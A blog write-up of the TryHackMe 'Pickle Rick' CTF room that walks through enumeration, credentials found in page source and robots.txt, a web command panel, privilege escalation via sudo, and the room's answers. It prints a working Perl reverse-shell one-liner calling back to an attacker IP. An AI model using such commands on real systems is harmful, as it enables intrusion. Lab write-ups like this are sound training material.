---
title: "Try Hack Me: Pickle Rick"
date: 2020-12-30
tags: [CTF]
excerpt: "Nmap, Gobuster, Perl"
---

## CTF Introduction
[Pickle Rick](https://tryhackme.com/room/picklerick) is a Try Hack Me room created by [Try Hack Me](https://tryhackme.com/p/tryhackme) themsleves. The room is rated as an easy CTF, making it a good room for practice. It is themed, as the title suggests, around the TV show Rick and Morty.

--- 

## Questions
1. What is the first ingredient Rick needs? A: `mr. meeseek hair`
2. What is the second ingredient Rick needs? A: `1 jerry tear`
3. What is the third ingredient Rick needs? A: `fleeb juice`

## Initial Nmap
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e7:fd:73:9b:b6:92:0b:9b:95:8e:69:e7:63:96:41:4f (RSA)
|   256 7a:10:28:5b:0d:4d:15:84:c0:a7:7a:c2:7b:98:02:e0 (ECDSA)
|_  256 50:87:7e:d4:f6:c8:c0:50:aa:b9:5a:7b:ed:1b:b2:54 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
There isn't much information from this Nmap scan, but there is a webpage to check out.

## IP/
### Initial Inspection
The webpage has a note, presumably left by Rick to Morty, asking Morty to find three ingredients on Rick's computer. The problem is, Rick forgot his password.

By inspecting the source for the webpage, there is a HTML comment containing the username `R1ckRul3s`.

### Gobuster
With not much to go on, I started up Gobuster as follows:

`gobuster dir -u http://{IP} -w .../directory-list-2.3-medium.txt -x .txt,.html,.php`

While letting it run, I checked if there was a `/robots.txt`, the file had been modified and instead contained `Wubbalubbadubdub`, a potential password.

Gobuster found two noteworthy pages:
* `login.php` - a login portal.
* `portal.php` - redircets to login portal, presumably an admin dashboard.

### Logging in
With the credentials `R1ckRul3s:Wubbalubbadubdub`, I was able to login at `{IP}/login.php`.

## IP/portal.php
### Ingredient 1
The first thing to see is an input field for running commands on the host. Running `ls` reveals a few of the website's files alongside `Sup3rS3cretPickl3Ingred.txt`. Attempting to cat out this file results in a "command is disabled" message.

Navigating to `{IP}/Sup3rS3cretPickl3Ingred.txt` shows the first ingredient.

### Reverse Shell
After trying some other commands, I found that directory traversal was possible but got me nowhere.

I then began trying some of [Pentest Monkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)'s reverse shells.

The Bash shell failed...

The PERL shell was successful!
* Start a listener with `sudo -lnvp 1337`.
* Run the following command:

```perl
perl -e 'use Socket;$i="ATTACKER IP";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## PERL Shell
### Ingredient 2
This ingredient can be found easily in `/home/rick/` by running `cat "second ingredients"`.

### Ingredient 3
Running `sudo -l` shows that all commands can be executed with no password.

Simply switch to root with `sudo su`, move to `/root` and run `cat 3rd.txt` to get the last ingredient.

## Summary
This was a very easy room that I believe is more suited to those who are looking to learn the absolute basics. That being said, it was still a fun room by Try Hack Me and I do recommend giving it a shot.

<img src="https://tryhackme-badges.s3.amazonaws.com/cjboyd.png" alt="TryHackMe">